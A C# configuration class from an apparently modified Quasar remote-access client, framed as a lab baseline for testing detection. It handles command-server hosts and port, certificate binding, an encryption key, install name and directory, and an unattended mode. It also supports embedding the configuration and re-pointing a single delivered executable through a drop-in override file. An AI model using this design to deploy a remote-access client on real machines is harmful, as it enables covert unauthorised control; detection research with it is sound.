// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using System;
using System.Globalization;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using Quasar.Common.Properties;

namespace Quasar.Common.Config
{
    /// <summary>
    /// Laboratory baseline external configuration.
    /// All run parameters of the baseline sample live in this file next to the executable so that
    /// one single build can be re-pointed between experiment conditions without rebuilding.
    /// </summary>
    [DataContract]
    public class LabConfig
    {
        [DataMember(Name = "labName", Order = 1)]
        public string LabName { get; set; }

        [DataMember(Name = "hosts", Order = 2)]
        public string Hosts { get; set; }

        [DataMember(Name = "port", Order = 3)]
        public int Port { get; set; }

        [DataMember(Name = "mutex", Order = 4)]
        public string Mutex { get; set; }

        [DataMember(Name = "tag", Order = 5)]
        public string Tag { get; set; }

        [DataMember(Name = "subnet", Order = 6)]
        public string Subnet { get; set; }

        [DataMember(Name = "serverCertificateBase64", Order = 7)]
        public string ServerCertificateBase64 { get; set; }

        [DataMember(Name = "serverSignatureBase64", Order = 8)]
        public string ServerSignatureBase64 { get; set; }

        [DataMember(Name = "encryptionKey", Order = 9)]
        public string EncryptionKey { get; set; }

        [DataMember(Name = "reconnectDelay", Order = 10)]
        public int ReconnectDelay { get; set; }

        [DataMember(Name = "logDirectoryName", Order = 11)]
        public string LogDirectoryName { get; set; }

        [DataMember(Name = "installSubDirectory", Order = 12)]
        public string InstallSubDirectory { get; set; }

        [DataMember(Name = "installName", Order = 13)]
        public string InstallName { get; set; }

        [DataMember(Name = "unattendedMode", Order = 14)]
        public bool UnattendedMode { get; set; }

        public LabConfig()
        {
            LabName = LabStrings.LabName;
            Hosts = string.Empty;
            Port = 4782;
            Mutex = string.Empty;
            Tag = string.Empty;
            Subnet = string.Empty;
            ServerCertificateBase64 = string.Empty;
            ServerSignatureBase64 = string.Empty;
            EncryptionKey = string.Empty;
            ReconnectDelay = 5000;
            LogDirectoryName = LabStrings.DefaultLogDirectory;
            InstallSubDirectory = LabStrings.DefaultInstallSubDirectory;
            InstallName = LabStrings.DefaultClientName;
            UnattendedMode = true;
        }

        /// <summary>
        /// The configuration file name which is looked up next to the running executable.
        /// </summary>
        public static string FileName
        {
            get { return LabStrings.ConfigFileName; }
        }

        /// <summary>
        /// Resource name of the configuration embedded into the baseline executable by the
        /// packaging console. A single file can therefore be delivered on its own.
        /// </summary>
        public static string EmbeddedResourceName
        {
            get { return "Quasar.LabBaseline." + LabStrings.ConfigFileName; }
        }

        /// <summary>
        /// Absolute path of the configuration file next to the running executable.
        /// The directory of the executing assembly is used so the lookup also works when the
        /// client assembly has been merged into the executable and when it is inspected offline.
        /// </summary>
        public static string DefaultPath
        {
            get { return Path.Combine(ExecutableDirectory, FileName); }
        }

        /// <summary>
        /// Directory of the assembly which carries this type.
        /// </summary>
        public static string ExecutableDirectory
        {
            get
            {
                try
                {
                    var location = typeof(LabConfig).Assembly.Location;
                    if (!string.IsNullOrEmpty(location))
                    {
                        var directory = Path.GetDirectoryName(location);
                        if (!string.IsNullOrEmpty(directory))
                            return directory;
                    }
                }
                catch (Exception)
                {
                    // fall through to the application base directory
                }

                return AppDomain.CurrentDomain.BaseDirectory;
            }
        }

        /// <summary>
        /// True when a configuration file exists next to the running executable.
        /// </summary>
        public static bool Exists()
        {
            return ExistsAt(DefaultPath);
        }

        public static bool ExistsAt(string path)
        {
            return !string.IsNullOrEmpty(path) && File.Exists(path);
        }

        /// <summary>
        /// Loads the effective configuration.
        /// <para>
        /// The configuration embedded into the executable is the base layer, the external
        /// <c>config.json</c> next to the executable is the override layer. Fields which are
        /// explicitly present in the external file replace the embedded ones; everything else is
        /// inherited. This lets one single packaged executable be re-pointed between experiment
        /// conditions by dropping a small override file next to it.
        /// </para>
        /// Returns null when neither layer exists, so callers can fall back to the compiled-in
        /// values exactly as upstream does.
        /// </summary>
        public static LabConfig Load()
        {
            var embedded = LoadEmbedded();
            string externalJson = ReadExternalJson();
            var external = externalJson == null ? null : FromJson(externalJson);

            if (embedded == null && external == null)
                return null;

            var effective = (embedded ?? new LabConfig()).Clone();
            if (external != null)
                MergeInto(effective, external, externalJson);
            return effective;
        }

        public static LabConfig LoadFrom(string path)
        {
            var json = ReadJsonAt(path);
            return json == null ? null : FromJson(json);
        }

        /// <summary>
        /// Reads the configuration embedded into the executing assembly, or null when the
        /// executable was not produced by the packaging console.
        /// </summary>
        public static LabConfig LoadEmbedded()
        {
            try
            {
                var assembly = typeof(LabConfig).Assembly;
                var names = assembly.GetManifestResourceNames();
                string match = null;
                foreach (var name in names)
                {
                    if (string.Equals(name, EmbeddedResourceName, StringComparison.Ordinal) ||
                        name.EndsWith("." + FileName, StringComparison.OrdinalIgnoreCase))
                    {
                        match = name;
                        break;
                    }
                }

                if (match == null)
                    return null;

                using (var stream = assembly.GetManifestResourceStream(match))
                {
                    if (stream == null)
                        return null;
                    using (var reader = new StreamReader(stream, Encoding.UTF8))
                        return FromJson(reader.ReadToEnd());
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static string ReadExternalJson()
        {
            return ReadJsonAt(DefaultPath);
        }

        private static string ReadJsonAt(string path)
        {
            try
            {
                if (string.IsNullOrEmpty(path) || !File.Exists(path))
                    return null;
                return File.ReadAllText(path, Encoding.UTF8);
            }
            catch (Exception)
            {
                return null;
            }
        }

        /// <summary>
        /// Overlays the fields which are explicitly present in the override layer.
        /// </summary>
        private static void MergeInto(LabConfig target, LabConfig layer, string layerJson)
        {
            if (HasKey(layerJson, "labName") && !string.IsNullOrWhiteSpace(layer.LabName)) target.LabName = layer.LabName;
            if (HasKey(layerJson, "hosts") && !string.IsNullOrWhiteSpace(layer.Hosts)) target.Hosts = layer.Hosts;
            if (HasKey(layerJson, "port") && layer.Port > 0) target.Port = layer.Port;
            if (HasKey(layerJson, "mutex") && !string.IsNullOrWhiteSpace(layer.Mutex)) target.Mutex = layer.Mutex;
            if (HasKey(layerJson, "tag") && layer.Tag != null) target.Tag = layer.Tag;
            if (HasKey(layerJson, "subnet") && layer.Subnet != null) target.Subnet = layer.Subnet;
            if (HasKey(layerJson, "serverCertificateBase64") && !string.IsNullOrWhiteSpace(layer.ServerCertificateBase64)) target.ServerCertificateBase64 = layer.ServerCertificateBase64;
            if (HasKey(layerJson, "serverSignatureBase64") && !string.IsNullOrWhiteSpace(layer.ServerSignatureBase64)) target.ServerSignatureBase64 = layer.ServerSignatureBase64;
            if (HasKey(layerJson, "encryptionKey") && !string.IsNullOrWhiteSpace(layer.EncryptionKey)) target.EncryptionKey = layer.EncryptionKey;
            if (HasKey(layerJson, "reconnectDelay") && layer.ReconnectDelay > 0) target.ReconnectDelay = layer.ReconnectDelay;
            if (HasKey(layerJson, "logDirectoryName") && !string.IsNullOrWhiteSpace(layer.LogDirectoryName)) target.LogDirectoryName = layer.LogDirectoryName;
            if (HasKey(layerJson, "installSubDirectory") && !string.IsNullOrWhiteSpace(layer.InstallSubDirectory)) target.InstallSubDirectory = layer.InstallSubDirectory;
            if (HasKey(layerJson, "installName") && !string.IsNullOrWhiteSpace(layer.InstallName)) target.InstallName = layer.InstallName;
            if (HasKey(layerJson, "unattendedMode")) target.UnattendedMode = layer.UnattendedMode;
        }

        private static bool HasKey(string json, string key)
        {
            if (string.IsNullOrEmpty(json))
                return false;
            return json.IndexOf("\"" + key + "\"", StringComparison.Ordinal) >= 0;
        }

        public void Save()
        {
            SaveTo(DefaultPath);
        }

        public void SaveTo(string path)
        {
            var dir = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);
            File.WriteAllText(path, ToJson(), new UTF8Encoding(false));
        }

        /// <summary>
        /// True when the configuration carries the laboratory certificate binding required to run
        /// the baseline standalone (release build, TLS validation active).
        /// </summary>
        public bool HasCertificateBinding
        {
            get
            {
                return !string.IsNullOrWhiteSpace(ServerCertificateBase64) &&
                       !string.IsNullOrWhiteSpace(ServerSignatureBase64);
            }
        }

        /// <summary>
        /// True when the configuration can drive the client on its own.
        /// </summary>
        public bool IsLabMode
        {
            get { return !string.IsNullOrWhiteSpace(Hosts) && HasCertificateBinding; }
        }

        /// <summary>
        /// True when at least the connection parameters are present.
        /// </summary>
        public bool IsUsable
        {
            get { return !string.IsNullOrWhiteSpace(Hosts); }
        }

        /// <summary>
        /// Builds the raw host list the upstream <c>HostsConverter</c> expects ("host:port;host:port;").
        /// Entries without an explicit port inherit <see cref="Port"/>.
        /// </summary>
        public string ComposeRawHosts()
        {
            if (string.IsNullOrWhiteSpace(Hosts))
                return string.Empty;

            var raw = new StringBuilder();
            var parts = Hosts.Split(';');
            foreach (var part in parts)
            {
                var entry = part == null ? string.Empty : part.Trim();
                if (entry.Length == 0)
                    continue;
                if (entry.IndexOf(':') < 0)
                    entry = entry + ":" + Port.ToString(CultureInfo.InvariantCulture);
                raw.Append(entry).Append(';');
            }
            return raw.ToString();
        }

        public LabConfig Clone()
        {
            return new LabConfig
            {
                LabName = LabName,
                Hosts = Hosts,
                Port = Port,
                Mutex = Mutex,
                Tag = Tag,
                Subnet = Subnet,
                ServerCertificateBase64 = ServerCertificateBase64,
                ServerSignatureBase64 = ServerSignatureBase64,
                EncryptionKey = EncryptionKey,
                ReconnectDelay = ReconnectDelay,
                LogDirectoryName = LogDirectoryName,
                InstallSubDirectory = InstallSubDirectory,
                InstallName = InstallName,
                UnattendedMode = UnattendedMode
            };
        }

        public static LabConfig FromJson(string json)
        {
            if (string.IsNullOrWhiteSpace(json))
                return null;

            try
            {
                var serializer = new DataContractJsonSerializer(typeof(LabConfig));
                using (var stream = new MemoryStream(Encoding.UTF8.GetBytes(json)))
                {
                    var parsed = (LabConfig)serializer.ReadObject(stream);
                    if (parsed == null)
                        return null;
                    if (parsed.LogDirectoryName == null) parsed.LogDirectoryName = LabStrings.DefaultLogDirectory;
                    if (parsed.InstallSubDirectory == null) parsed.InstallSubDirectory = LabStrings.DefaultInstallSubDirectory;
                    if (parsed.InstallName == null) parsed.InstallName = LabStrings.DefaultClientName;
                    if (parsed.LabName == null) parsed.LabName = LabStrings.LabName;
                    return parsed;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        public string ToJson()
        {
            var sb = new StringBuilder();
            sb.AppendLine("{");
            AppendString(sb, "labName", LabName, true);
            AppendString(sb, "hosts", Hosts, true);
            AppendNumber(sb, "port", Port, true);
            AppendString(sb, "mutex", Mutex, true);
            AppendString(sb, "tag", Tag, true);
            AppendString(sb, "subnet", Subnet, true);
            AppendString(sb, "serverCertificateBase64", ServerCertificateBase64, true);
            AppendString(sb, "serverSignatureBase64", ServerSignatureBase64, true);
            AppendString(sb, "encryptionKey", EncryptionKey, true);
            AppendNumber(sb, "reconnectDelay", ReconnectDelay, true);
            AppendString(sb, "logDirectoryName", LogDirectoryName, true);
            AppendString(sb, "installSubDirectory", InstallSubDirectory, true);
            AppendString(sb, "installName", InstallName, true);
            AppendBool(sb, "unattendedMode", UnattendedMode, false);
            sb.AppendLine("}");
            return sb.ToString();
        }

        public override string ToString()
        {
            return "LabConfig(hosts=" + (Hosts ?? string.Empty) + ", port=" + Port.ToString(CultureInfo.InvariantCulture) +
                   ", tag=" + (Tag ?? string.Empty) + ", subnet=" + (Subnet ?? string.Empty) + ")";
        }

        private static void AppendString(StringBuilder sb, string name, string value, bool comma)
        {
            sb.Append("  \"").Append(name).Append("\": \"").Append(Escape(value)).Append("\"").AppendLine(comma ? "," : string.Empty);
        }

        private static void AppendNumber(StringBuilder sb, string name, int value, bool comma)
        {
            sb.Append("  \"").Append(name).Append("\": ").Append(value.ToString(CultureInfo.InvariantCulture)).AppendLine(comma ? "," : string.Empty);
        }

        private static void AppendBool(StringBuilder sb, string name, bool value, bool comma)
        {
            sb.Append("  \"").Append(name).Append("\": ").Append(value ? "true" : "false").AppendLine(comma ? "," : string.Empty);
        }

        private static string Escape(string value)
        {
            if (string.IsNullOrEmpty(value))
                return string.Empty;

            var sb = new StringBuilder(value.Length + 8);
            foreach (var ch in value)
            {
                switch (ch)
                {
                    case '"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (ch < ' ')
                            sb.Append("\\u").Append(((int)ch).ToString("x4", CultureInfo.InvariantCulture));
                        else
                            sb.Append(ch);
                        break;
                }
            }
            return sb.ToString();
        }
    }
}
